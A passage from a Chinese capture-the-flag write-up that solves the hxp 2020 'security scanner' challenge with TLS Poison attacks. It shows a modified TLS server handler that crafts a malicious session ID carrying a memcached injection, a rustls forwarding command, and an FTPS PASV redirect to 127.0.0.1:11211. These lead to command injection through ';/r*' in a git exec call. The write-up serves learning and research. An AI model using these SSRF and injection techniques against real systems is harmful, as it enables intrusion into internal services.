了。</p><p>既然最后一步我们知道了，我们就得想办法如果绕过前面的验证步骤。主要验证也就是如下两个步骤：</p><ul><li>正则表达式：<code>^[0-9a-zA-Z:\.\/-]{1,64}</code>。表达式比较严格，看起来并没有什么可以让我们进行命令注入的机会。</li><li>即使绕过了正则，但是<code>file_get_contents</code>并不会认为<code>;/readflag</code>是合法协议，也不能接着去执行。</li></ul><p>所以问题就来到了如何将我们的 payload 写入 memcached 当中以及我们如何绕过前面两个正则。</p><p>既然是要写入 memcached 我们不难想到 2020 年 black hat 上的议题 When TLS Hack You ，其中作者使用的 demo 就是通过 TLS 配合 DNS Rebinding 来对 memcached 发起 SSRF 攻击，所以如何将我们的 payload 写入到 memcached 当中基本有了个大致的思路，问题是如何实现利用这个思路呢？</p><p>我们再来看看如果真是使用 TLS Poison 攻击的话，使用 HTTPS 是不是就可以满足以上两个限制的条件了呢？确实如此，<code>https://</code>并没有使用其他禁止的字符，并且我们可以通过 HTTPS 让题目的<code>file_get_contents</code>得到任意内容，包括满足他所需要的<code>001e# service=git-upload-pack\n</code>这个条件。</p><p>所以似乎看起来 TLS Poison 正是这个题目的关键！如果是这样的话，接下来我们就需要确定，我们应该使用 <code>file_get_contents</code>还是 git 来进行操作呢？也就是说哪一个支持 TLS 会话重用这个特性呢？我们知道<code>file_get_contents</code>并没有依赖 libcurl ，我们如果直接查看 PHP 源代码有点麻烦，不如直接通过让其访问我们 TLS Poison Demo 来测试，如果能有支持 TLS 会话重用，在 302 时，也就是第二次访问我们 TLS Server 即会带上 Session ID ，这个我们可以直接用wireshark 本地抓包即可看到了。但是经过测试其实我们可以看到<code>file_get_contents</code>并没有在第二次 TLS 会话时重用 Session ID，如图所示：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210510000326.png" alt=""></p><p>所以接下来我们就只能寄希望于 git 了，那么 git 是否支持 TLS 重用会话？怎么确定 git 是否支持 TLS 会话重用呢？我们能不能确定 git 使用的是什么网络请求资源依赖库呢？比如 libcurl ？如果是 libcurl ，我们就好办了，因为明确知道 libcurl 对于 HTTPS 的支持是可以支持会话重用的，至少对于 OpenSSL 或者 GnuTLS 来说，都是支持此项特性的。</p><p>那么到底如何确定呢？这有点类似于找一个站点使用了什么 web 框架，一般来说我们可以尝试通过找站点特征、报错回显等方式来确定，但是 git 发起网络请求的 User-Agent 中只带了它自己的 UA 特征，并没有显示是否使用 libcurl ，在代码中虽然可以找到<code>&lt;curl/curl.h&gt;</code>，但是到底用没用我们似乎不是很好判断；所以我们可以尝试通过报错回显来确定 git 到底用没用 libcurl (idea from @zsx )，如何引起这个报错呢？不难想到我们可以尝试用一个 libcurl 不支持的协议来确定，比如 gopher 协议。接下来我们可以在自己服务器上放一个 php 让其 Location 跳转到 gopher 协议上，例如：</p><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ cat 302.php                                                                                                                         </span><br><span class="line">&lt;?php                                                                                                                                                                   </span><br><span class="line">header(<span class="hljs-string">"Location: gopher://localhost/"</span>);</span><br><span class="line"></span><br><span class="line">$ git ls-remote --tags -- http://localhost/302.php                                                                                    </span><br><span class="line">fatal: unable to access <span class="hljs-string">'http://localhost/302.php/'</span>: Protocol <span class="hljs-string">"gopher"</span> not supported or disabled <span class="hljs-keyword">in</span> libcurl</span><br></pre></td></tr></tbody></table></figure><p></p><p>我们就可以看到明显的 libcurl 错误回显。</p><p>既然确定了可以使用 git 来进行 TLS Poison 攻击 Memcached ，那么具体我们应该这么做呢？我们从 getFlag 开始来看看：</p><ol><li>要让<code>exec</code>执行<code>;/readflag</code>，我们要让<code>;/readflag</code>在 Memcached 中的 Value 为 “OK”</li><li>那怎么写入<code>;/readflag</code>呢？我们可以利用 git 来实施 TLS Poison ，向 Memcached 中写入 Key 为<code>;/readflag</code>，Value 为 “OK”</li><li>那怎么实施 TLS Poison 呢？部署 HTTPS Server ，先绕过之前两个限制，在 git 请求 HTTPS Server 的时候实行 TLS Poison</li></ol><p>具体流程图如下：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/dfyz/ctf-writeups@master/hxp-2020/security%20scanner/tls_poison.png" alt=""></p><p>其中我们可以使用双 A 记录的方法来优化 DNS Rebinding 方式，具体关于 TLS Poison 详细解释见：<a href="https://blog.zeddyu.info/2021/04/20/tls-poison/">一篇文章带你读懂 TLS Poison 攻击</a></p><p>这里 wp 作者放出的 exp 其实并不可用，在 TLS 握手时会产生错误，所以我又不得不使用其他工具实现这个 exp ，而整个 exp 构造中比较关键的地方在于，如何让<code>file_get_contents</code>正常获取到指定内容后，git 再访问时就需要使用恶意的 TLS Server 。对于这个点，我们可以从请求的 UA 上做区分，判断 UA 中是否有 git 来区分这两者请求来返回对应的响应，所以 rustls 我就不考虑了…这玩意着实难改，于是选用了 tlslite-ng 作为 TLS 服务器，并修改<code>MySimpleHTTPHandler</code>函数中的处理 HTTP 请求的关键代码，如下：</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> <span class="hljs-string">'git'</span> <span class="hljs-keyword">in</span> str(self.headers):</span><br><span class="line">  print(<span class="hljs-string">'This is git! Redirecting it back to memcached and shutting down'</span>)</span><br><span class="line">  <span class="hljs-keyword">assert</span> session_id, <span class="hljs-string">'Session id should have been set at this point'</span></span><br><span class="line">  headers = {</span><br><span class="line">    <span class="hljs-string">'Location'</span>: <span class="hljs-string">f'https://tls.exmaple.com:11211/pwned'</span>,</span><br><span class="line">  }</span><br><span class="line">  self.wfile.write(get_http_response(<span class="hljs-number">302</span>, headers, <span class="hljs-string">''</span>))</span><br><span class="line">  <span class="hljs-keyword">return</span></span><br><span class="line"><span class="hljs-keyword">else</span>:</span><br><span class="line">  print(<span class="hljs-string">'This is PHP! Showing them something that looks like a git repo and stealing sandbox ID'</span>)</span><br><span class="line">  b64_sandbox_id = re.search(<span class="hljs-string">'/(.{14})/'</span>, self.path).group(<span class="hljs-number">1</span>)</span><br><span class="line">  <span class="hljs-keyword">while</span> len(b64_sandbox_id) % <span class="hljs-number">4</span> != <span class="hljs-number">0</span>:</span><br><span class="line">    b64_sandbox_id += <span class="hljs-string">'='</span></span><br><span class="line">    sandbox_id = base64.b64decode(b64_sandbox_id)</span><br><span class="line">    <span class="hljs-keyword">assert</span> len(sandbox_id) == <span class="hljs-number">10</span>, <span class="hljs-string">f'The sandbox id should have exactly 10 bytes, got: <span class="hljs-subst">{sandbox_id}</span>'</span></span><br><span class="line">    session_id = <span class="hljs-string">b'\r\nset '</span> + sandbox_id + <span class="hljs-string">b';/r* 0 0 2\r\nOK\r\n'</span></span><br><span class="line">    <span class="hljs-keyword">assert</span> len(session_id) == <span class="hljs-number">32</span>, <span class="hljs-string">f'The session should have exactly 32 bytes, got: <span class="hljs-subst">{session_id}</span>'</span></span><br><span class="line">    print(<span class="hljs-string">f'Got sandbox id: <span class="hljs-subst">{sandbox_id}</span>, session_id: <span class="hljs-subst">{session_id}</span>'</span>)</span><br><span class="line"></span><br><span class="line">    fake_git = <span class="hljs-string">'001e# service=git-upload-pack\n'</span></span><br><span class="line">    self.wfile.write(get_http_response(<span class="hljs-number">200</span>, {}, fake_git))</span><br><span class="line">    <span class="hljs-keyword">return</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>这里因为题目设置了 sandbox ，占用了 10 字节，而 TLS 1.2 中的 SessionID 局限于 32 字节，所以我们没办法直接使用<code>;/readflag</code>，否则会超出长度，直接使用<code>;/r*</code>也可以执行读取 flag 命令。最后打包整理的 Exp 放在：<a href="https://github.com/ZeddYu/TLS-poison/tree/master/Practice1-hxp2020/solution1" target="_blank" rel="noopener">https://github.com/ZeddYu/TLS-poison/tree/master/Practice1-hxp2020/solution1</a></p><p>在自己的服务器上搭建好 TLS 服务器之后，最后用 exp.py 自动发包就能拿到 flag 了：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210510212104.png" alt=""></p><h3 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution 2"></a>Solution 2</h3><p>当然如果只是简单的复现 TLS Poison 我也不会这么详细的写一篇文章来讲这个题了， CTF 能带给我最大的快乐就是看到一些在自己预期之外的东西，这些东西往往都更有意思，也更 Amazing 。</p><p>结合前文，我们这里可以尝试使用 FTPS 来进行解答这个题目。如果使用 FTPS ，那么重定向、DNS Rebinding 的操作我们就可以不需要了，因为可以使用<code>PASV</code>直接将数据通道指向 127.0.0.1:11211 即可。</p><p>那么接下来就需要确定 git 中的 libcurl 是否受到<code>PASV</code>漏洞影响了，我们可以从 git 版本、简单搭建一个恶意的 FTP 服务器进行测试，这里就不展开进行测试了。（其实是比较懒）我们这里就直接开始尝试使用 FTPS 进行解题。</p><p>按照之前的流程，我们需要确定几个点：</p><ul><li>如何绕过之前题目使用<code>file_get_contents</code>对文件内容确认？我们可以直接创建<code>/info/ref</code>文件，内容为题目要求的内容即可</li><li>如何绕过正则？我们只需要配置好匿名 ftps 即可，就不需要引入为了用户认证而使用的<code>@</code>符号了，其余的字符就属于正则内的字符了</li><li>用隐式还是显式？因为我们使用的格式是<code>ftps://ftps.exmaple.com:11211/</code>这种形式，这只能是隐式 FTPS 的格式，所以使用隐式 FTPS</li></ul><p>剩下的便是如何构造 exp 的问题了，怎么去弄一个隐式 FTPS ，难道还要修改个恶意 vsftpd ？那样比较麻烦，这里我们可以使用 rustls 的转发功能，该功能可以帮我们处理了 TLS 创建的问题，并且按照之前的基础，我们也可以把它直接作为恶意 TLS 服务器，这样我们就只需要弄一个 socket 用来处理 FTP 即可。</p><p>依旧使用我仓库的 TLS 工具：<a href="https://github.com/ZeddYu/TLS-poison/" target="_blank" rel="noopener">https://github.com/ZeddYu/TLS-poison/</a> ，按照 setup 做好初始化后，使用如下命令开启 rustls 的转发功能，将 TLS 上层流量转发到 2048 端口：</p><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TLS-poison/client-hello-poisoning/custom-tls/target/debug/custom-tls -p 11211 --certs /home/ubuntu/tls/fullchain.pem --key /home/ubuntu/tls/privkey.pem forward 2048</span><br></pre></td></tr></tbody></table></figure><p></p><p>然后在 2048 端口我们弄个 socket 监听并读一下 FTP ，然后就是处理 FTP 命令的事情了，这里可以使用 vsftpd 来进行命令响应的参考，最后实现：<a href="https://github.com/ZeddYu/TLS-poison/blob/master/Practice1-hxp2020/solution2/curl_exp.py" target="_blank" rel="noopener">https://github.com/ZeddYu/TLS-poison/blob/master/Practice1-hxp2020/solution2/curl_exp.py</a></p><p><strong>PS：这里 FTP 服务记得要完整实现对 PASV 之后的命令处理，否则攻击失败。</strong></p><p>天知道这个坑了我多久…当时死活都不能复现，问作者 0xbb 也不知道什么情况，又是排 curl 版本，又是排 git 版本，又是排 OpenSSL ，又是排 GnuTLS ，反正各种排 bug ，万念俱灰，最后才找到这个地方…简直</p><p>这里我自己编译了一个存在<code>pasv</code>漏洞的 curl 调试，访问我们的 ftps 服务器之后就会对我们 127.0.0.1:11211 进行 TLS 会话重用，就会将我们的 payload 发送到 11211 端口了：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210510214036.png" alt=""></p><p>写入之后基本上就没有什么问题了。</p><p>整个流程我们整理一下：</p><ul><li><p>首先得访问一次题目拿到 cookie </p></li><li><p>一开始的<code>file_get_contents</code>我们可以使用 vsftpd 来在匿名 ftp 目录下放置<code>/info/ref</code>文件，文件内容就是 “001e# service=git-upload-pack\n”</p></li><li><p>题目使用<code>file_get_contents</code>访问之后，我们就可以关闭 vsftpd ，然后开启 rustls 恶意 TLS 服务器，注意提前设置在 redis 当中设置好 payload</p></li><li><p>题目执行<code>exec</code>，也就是使用 git 来访问我们的 FTPS 服务器时，双方建立 TLS 握手，我们会设置可以执行读取 flag 的 Session ID </p></li><li><p>建立握手完毕后，执行 FTP 流程</p></li><li><p>在题目 git 处理 FTP 流程中，我们会给 git 发出的<code>PASV</code>命令请求的响应<code>227 Entering Passive Mode (127,0,0,1,43,203)\r\n</code></p></li><li><p>git 会根据得到的 127.0.0.1:11211 这个地址尝试进行 TLS 会话重用</p></li><li><p>至此，完成对 Memcached 的攻击，成功写入<code>\r\nset 1234567890;/r* 0 0 2\r\nOK\r\n</code>，其中那串连续数字我用来表示 sandbox id</p></li><li><p>带着最开始设置的 cookie 向题目提交 url 地址为<code>;/r*</code>，此时题目向 Memcached 查询 <code>1234567890;/r*</code>的值，得到 url 的值为 OK ，绕过限制</p></li><li><p>题目执行<code>exec("timeout -s KILL 3 git ls-remote --tags -- $url", $output, $return_var);</code>，其中<code>$url</code>就是我们传入的<code>;/r*</code>，完成命令注入，执行读取 flag 命令拿到 flag </p></li></ul><p>至此，完成这个题目的 FTPS 解法。exp 效果图如下：</p><p><img 